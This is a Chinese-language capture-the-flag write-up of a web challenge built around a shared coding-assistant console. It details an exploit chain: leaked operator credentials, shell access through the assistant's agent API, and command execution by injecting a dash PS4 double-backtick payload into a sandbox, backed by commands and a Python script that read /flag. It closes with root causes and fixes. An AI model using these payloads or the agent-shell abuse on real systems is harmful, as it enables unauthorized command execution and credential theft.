# 共享编码助手控制台

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-12FACCE4` · 状态 solved
```

## 一句话

一个团队共享的编码助手控制台：租户可以查看工作区会话、运行日志与内部依赖状态， 并通过控制台提供的运维入口检查编码助手运行时。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| （本题无附件） | | |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 入口与信息收集

入口是一个 portal，核心接口：

```
POST /api/portal/session       -> {token, tenant}
```

GET  /api/portal/activity      -> 所有镜像 transcript

GET  /api/portal/events        -> 事件流

/assistant/*                   -> 反向代理到本机 opencode server

POST /api/portal/session 会返回随机 guest token；把它放进 Authorization: Bearer 后请求 /api/portal/activity。

这里存在租户隔离缺陷：portal 没有按 tenant 过滤 transcript，任意 guest token 都能拿到所有会话。bootstrap 的 runtime self-check 中泄露了：

```
OPENCODE_PASSWORD=OPENCODE_SERVER_PASSWORD=<operator password>
RSI_API_KEY=sk-goodlucktotpctf2026
SANDBOX_URL=http://sandbox/
```

这个 operator password 不是 flag，但它能通过 /assistant 的 Basic auth。

### 2. 通过 assistant 进入 agent shell

使用 opencode:<operator password> 访问：

GET  /assistant/api/info

POST /assistant/api/session/<sessionID>/shell

GET  /assistant/api/session/<sessionID>/message

/shell 的 body 是：

```
{"command": "id; pwd; ls -la /"}
```

结果会出现在后续 /message 的 shell message 里。确认运行身份为：

```
uid=1000(agent) gid=1000(agent)
```

agent 容器内可以访问内部 sandbox：

http://sandbox/  -> 172.16.111.2

### 3. Sandbox 诊断服务

Sandbox 是 Apache + PHP，页面只有三个 env 输入：

envs[LANG]

envs[TZ]

envs[EXTRA]

固定执行：

exec 2>&1

set -x

```
echo hello
```

并将输出放进页面 <pre>。

服务端会把提交的 env 传给 probe shell；PS4 也会生效。例如：

```
envs[PS4]=PWN
```

输出 trace 的前缀会变成 PWNecho hello。

### 4. 关键漏洞：dash 的 PS4 双反引号

在 dash 中，PS4 的展开逻辑对反引号处理有缺陷：

• 单个反引号对：

```
PS4='`id`'
```

会被剥离，不执行命令。

• 两个相邻的反引号命令替换：

```
PS4='`id``id`'
```

会执行 id，输出出现在 xtrace 中。

本地验证：

```
PS4='`id``id`' dash -c 'set -x; echo hello'
```

# uid=0(root) gid=0(root) groups=0(root)echo hello

# hello

在 sandbox 中以 www-data 执行：

```
envs[PS4]=`id``id`
```

返回：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)echo hello
```

hello

这说明命令替换的输出会被拼进 PS4，再随 set -x 的 trace 一起写进响应。

### 5. 读取动态 Flag

先枚举根目录：

```
envs[PS4]=`ls -la /``ls -la /`
```

关键结果：

drwxr-xr-x 2 root root 4096 answers

lrwxrwxrwx 1 root root   13 flag -> /answers/flag

即 /flag 是指向 /answers/flag 的符号链接，且 www-data 可读。

直接读取：

```
envs[PS4]=`cat /flag``cat /flag`
```

响应中的 <pre>：

«FLAG»echo hello

hello

### 6. 最小复现脚本

在 agent 容器内运行：

```python
import urllib.parse, urllib.request
payload = "`cat /flag``cat /flag`"
data = urllib.parse.urlencode({
```

"envs[LANG]": "C.UTF-8",

"envs[TZ]": "UTC",

"envs[EXTRA]": "",

"envs[PS4]": payload,

```
}).encode()
req = urllib.request.Request("http://sandbox/", data=data, method="POST")
```

with urllib.request.urlopen(req, timeout=20) as r:

```
print(r.read().decode("utf-8", "replace"))
```

在返回 HTML 中搜索 FLAG{ 即可。

对应脚本：console/ps4_remote.py。

### 7. 根因与修复

Portal 租户隔离

/api/portal/activity 只验证 bearer token 有效，然后返回全部 runtime.transcripts，没有按 tenant 过滤。修复方式是每个 token 绑定 tenant，只返回该 tenant 的 session/transcript。

Sandbox 的 PS4 注入

Sandbox 把调用方提供的环境变量原样传给 probe shell，其中包含 PS4。set -x 会展开 PS4，dash 的 PS4 解析器又允许特定反引号形式执行命令替换，导致命令执行。

修复建议：

• 不要从请求中接受 PS4、BASH_ENV、ENV、SHELLOPTS 等 shell 控制变量；
• 使用显式 allowlist 构造环境，必要时 env -i；
• 不要在不可信环境下使用 set -x；
• 不要用字符串拼接方式把环境变量交给 sh -c。

Flag 文件权限

/answers/flag 可被 sandbox 的 www-data 读取。即便 shell 注入被修掉，也建议限制 flag 文件权限，避免 Web 进程直接读取。

### 8. 利用链总结

portal guest token

-> /api/portal/activity 泄露 OPENCODE_PASSWORD

-> /assistant Basic auth

-> agent shell

-> http://sandbox/ 的 env 覆盖

-> dash PS4 相邻反引号命令执行

-> cat /flag

-> «FLAG»

## 结果

- flag sha256：`3ea53485b6fffca0604f6326776d6732f8128786b63e69939511a8d6066c88e8`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 19 节《共享编码助手控制台》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
